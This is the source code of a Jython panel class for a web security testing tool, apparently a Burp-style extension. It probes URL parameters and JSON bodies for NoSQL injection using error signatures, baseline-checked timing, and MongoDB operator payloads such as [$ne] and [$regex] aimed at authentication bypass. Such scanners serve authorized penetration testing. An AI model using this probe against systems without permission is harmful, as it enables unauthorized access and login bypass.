class NoSqlPanel(BaseToolPanel):
    def __init__(self, callbacks=None, helpers=None):
        super(NoSqlPanel, self).__init__("NoSQL Injection", callbacks, helpers)

    def _add_extra_options(self):
        self._extra_panel.add(JLabel("Params (comma-sep):"))
        self._params_field = JTextField(14)
        self._params_field.setToolTipText("URL params to inject. Blank = all detected params")
        self._extra_panel.add(self._params_field)
        self._extra_panel.add(JLabel("JSON body (opt):"))
        self._body_field = JTextField(22)
        self._body_field.setToolTipText(
            'Raw JSON body to inject into e.g. {"username":"INJECT","password":"INJECT"}. '
            'INJECT is replaced with each payload.')
        self._extra_panel.add(self._body_field)
        self._extra_panel.add(JLabel("Delay (ms):"))
        self._delay_field = JTextField("0", 5)
        self._delay_field.setToolTipText("Milliseconds to wait between requests (0 = no delay)")
        self._extra_panel.add(self._delay_field)

    def _run_check(self, url, auth_hdrs, out, sf):
        import time as _nosql_time
        import json as _json
        try:
            _delay = max(0.0, float(self._delay_field.getText().strip() or "0")) / 1000.0
        except Exception:
            _delay = 0.0

        qs = url.split("?", 1)[1] if "?" in url else ""
        pairs = [p.split("=", 1) for p in qs.split("&") if "=" in p]
        params_override = self._params_field.getText().strip()
        body_tmpl = self._body_field.getText().strip()

        if params_override:
            test_params = [p.strip() for p in params_override.split(",") if p.strip()]
        elif pairs:
            test_params = [k for k, v in pairs]
        else:
            test_params = []

        base = url.split("?")[0]
        _append(out, "[*] NoSQL injection -- {} params, {} payloads".format(
            len(test_params) or "(JSON body only)", len(_NOSQL_PAYLOADS)))

        def _nq_enc(s):
            """URL-encode a payload value (NoSQL payloads contain & = [ ] { } ' : which would
            otherwise split the query string)."""
            try:
                import java.net.URLEncoder as _E
                return _E.encode(s, "UTF-8")
            except Exception:
                return s.replace(" ", "+")

        def _check_resp(s, h, b, payload, mode):
            bl = (b or "").lower()
            err_hit = any(sig in bl for sig in _NOSQL_ERROR_SIGS)
            if err_hit:
                _append(out, "  [VULN] Error-based NoSQLi! mode={} payload={!r}".format(
                    mode, payload[:60]))
                return True
            return False

        # Baseline RTT (median of 3) so a single slow response isn't mistaken for time-based
        # injection. A time hit must EXCEED baseline+4s AND reproduce on a re-send.
        _nq_base_rtt = [0.5]
        try:
            import time as _nqt0
            _samp = []
            for _ in range(3):
                _t = _nqt0.time()
                try:
                    _http(url, req_headers=auth_hdrs, timeout_ms=12000)
                    _samp.append(_nqt0.time() - _t)
                except (Exception, JavaException):
                    pass
            if _samp:
                _nq_base_rtt[0] = sorted(_samp)[len(_samp) // 2]
        except Exception:
            pass
        _nq_thresh = _nq_base_rtt[0] + 4.0

        def _time_confirm(send_fn):
            """send_fn() -> elapsed seconds (or None). A delay is confirmed only if it
            exceeds baseline+4s AND reproduces on a second send (rules out jitter)."""
            _e1 = send_fn()
            if _e1 is None or _e1 < _nq_thresh:
                return False
            _e2 = send_fn()
            return _e2 is not None and _e2 >= _nq_thresh

        # Phase 1: URL parameter injection
        if test_params:
            _append(out, "[*] Phase 1: URL param injection...")
            for param in test_params:
                if sf[0]: break
                for payload in _NOSQL_PAYLOADS:
                    if sf[0]: break
                    if _delay > 0:
                        _nosql_time.sleep(_delay)
                    new_pairs = []
                    for k, v in pairs:
                        if k == param:
                            new_pairs.append("{}={}".format(k, _nq_enc(payload)))
                        else:
                            new_pairs.append("{}={}".format(k, v))
                    if not any(k == param for k, v in pairs):
                        new_pairs.append("{}={}".format(param, _nq_enc(payload)))
                    test_url = base + "?" + "&".join(new_pairs)
                    try:
                        import time as _t2
                        t0 = _t2.time()
                        s, h, b = _http(test_url, req_headers=auth_hdrs, timeout_ms=12000)
                        elapsed = _t2.time() - t0
                        if _check_resp(s, h, b, payload, "param={}".format(param)):
                            self._log_vuln(
                                "NoSQLi param={} payload={!r}".format(param, payload[:50]),
                                test_url, headers=auth_hdrs)
                        elif elapsed >= _nq_thresh and ("sleep" in payload.lower() or "date()" in payload.lower()):
                            # only treat as time-based when the payload actually has a sleep
                            # primitive, and re-confirm to defeat jitter.
                            def _resend(_u=test_url):
                                _tt = _t2.time()
                                try:
                                    _http(_u, req_headers=auth_hdrs, timeout_ms=12000)
                                    return _t2.time() - _tt
                                except (Exception, JavaException):
                                    return None
                            if _time_confirm(_resend):
                                _append(out, "  [VULN] Time-based ({:.1f}s, reproduced) param={} payload={!r}".format(
                                    elapsed, param, payload[:50]))
                                self._log_vuln(
                                    "NoSQLi time-based {:.1f}s param={} payload={!r}".format(
                                        elapsed, param, payload[:50]), test_url, headers=auth_hdrs)
                            else:
                                _append(out, "  [-]   param={} {!r} -- {:.1f}s slow but did NOT reproduce (jitter)".format(
                                    param, payload[:40], elapsed))
                        else:
                            _append(out, "  [-]   param={} {!r} -- no sig, {:.1f}s".format(
                                param, payload[:40], elapsed))
                    except (RuntimeError, Exception, JavaException) as e:
                        _append(out, "  [!] {}: {}".format(param, str(e)[:70]))

        # Phase 2: JSON body injection
        if body_tmpl:
            _append(out, "")
            _append(out, "[*] Phase 2: JSON body injection...")
            auth_h2 = dict(auth_hdrs)
            auth_h2["Content-Type"] = "application/json"
            for payload in _NOSQL_PAYLOADS:
                if sf[0]: break
                if _delay > 0:
                    _nosql_time.sleep(_delay)
                body_str = body_tmpl.replace("INJECT", payload)
                try:
                    import time as _t3
                    t0 = _t3.time()
                    s, h, b = _http(base, method="POST", req_headers=auth_h2,
                                      body_str=body_str, timeout_ms=12000)
                    elapsed = _t3.time() - t0
                    if _check_resp(s, h, b, payload, "json-body"):
                        self._log_vuln(
                            "NoSQLi JSON body payload={!r}".format(payload[:50]), base,
                            method="POST", headers=auth_h2, body=body_str)
                    elif elapsed >= _nq_thresh and ("sleep" in payload.lower() or "date()" in payload.lower()):
                        def _resendj(_bs=body_str):
                            _tt = _t3.time()
                            try:
                                _http(base, method="POST", req_headers=auth_h2, body_str=_bs, timeout_ms=12000)
                                return _t3.time() - _tt
                            except (Exception, JavaException):
                                return None
                        if _time_confirm(_resendj):
                            _append(out, "  [VULN] Time-based ({:.1f}s, reproduced) payload={!r}".format(
                                elapsed, payload[:50]))
                            self._log_vuln(
                                "NoSQLi time-based json {:.1f}s payload={!r}".format(
                                    elapsed, payload[:50]), base, method="POST", headers=auth_h2, body=body_str)
                        else:
                            _append(out, "  [-]   JSON body {!r} -- {:.1f}s slow but did NOT reproduce".format(
                                payload[:40], elapsed))
                    else:
                        _append(out, "  [-]   JSON body {!r} -- {:.1f}s".format(
                            payload[:40], elapsed))
                except (RuntimeError, Exception, JavaException) as e:
                    _append(out, "  [!] JSON body {}: {}".format(payload[:30], str(e)[:70]))

        # Phase 3: Operator injection in URL params (param[$ne]=...) WITH a benign-value
        # baseline -- only flag when the operator response materially DIFFERS from giving
        # the param a normal value (kills the old "any 200 containing 'user'" false positive).
        if test_params:
            _append(out, "")
            _append(out, "[*] Phase 3: MongoDB operator injection (param[$ne]/[$gt]/[$regex]) with baseline diff...")
            op_payloads = [("[$ne]", "vaptzzz"), ("[$gt]", ""), ("[$regex]", ".*"),
                           ("[$exists]", "true"), ("[$nin][]", "vaptzzz")]
            for param in test_params:
                if sf[0]: break
                # benign-value baseline for THIS param (other params kept intact)
                _blp = []; _seen = False
                for k, v in pairs:
                    if k == param:
                        _blp.append("{}=vaptbenign123".format(k)); _seen = True
                    else:
                        _blp.append("{}={}".format(k, v))
                if not _seen:
                    _blp.append("{}=vaptbenign123".format(param))
                try:
                    _bs, _bh, _bb = _http(base + "?" + "&".join(_blp), req_headers=auth_hdrs, timeout_ms=10000)
                    _bsig = (_bs, len(_bb or ""))
                except (Exception, JavaException):
                    _bsig = (None, 0)
                for op, val in op_payloads:
                    if sf[0]: break
                    _ip = []; _seen2 = False
                    for k, v in pairs:
                        if k == param:
                            _ip.append("{}{}={}".format(k, op, _nq_enc(val))); _seen2 = True
                        else:
                            _ip.append("{}={}".format(k, v))
                    if not _seen2:
                        _ip.append("{}{}={}".format(param, op, _nq_enc(val)))
                    test_url = base + "?" + "&".join(_ip)
                    try:
                        s, h, b = _http(test_url, req_headers=auth_hdrs, timeout_ms=10000)
                        _diff = (_bsig[0] is not None and (s != _bsig[0]
                                 or abs(len(b or "") - _bsig[1]) > max(80, int(_bsig[1] * 0.2) + 1)))
                        if s == 200 and _diff:
                            _append(out, "  [VULN] Operator bypass! {}{}={} -> HTTP 200, response DIFFERS from "
                                         "the benign-value baseline (vs HTTP {}, {}b vs {}b) -- likely auth/filter "
                                         "bypass.".format(param, op, val, _bsig[0], len(b or ""), _bsig[1]))
                            self._log_vuln("NoSQLi operator bypass {}{}={}".format(param, op, val),
                                           test_url, headers=auth_hdrs)
                        elif s == 200:
                            _append(out, "  [-]   {}{} -> HTTP 200 ~ baseline ({}b vs {}b), no bypass.".format(
                                param, op, len(b or ""), _bsig[1]))
                        else:
                            _append(out, "  [-]   {}{} -- HTTP {}".format(param, op, s))
                    except (RuntimeError, Exception, JavaException) as e:
                        _append(out, "  [!] {}: {}".format(op, str(e)[:70]))

        _append(out, "")
        _append(out, "[+] NoSQL injection probe complete.")


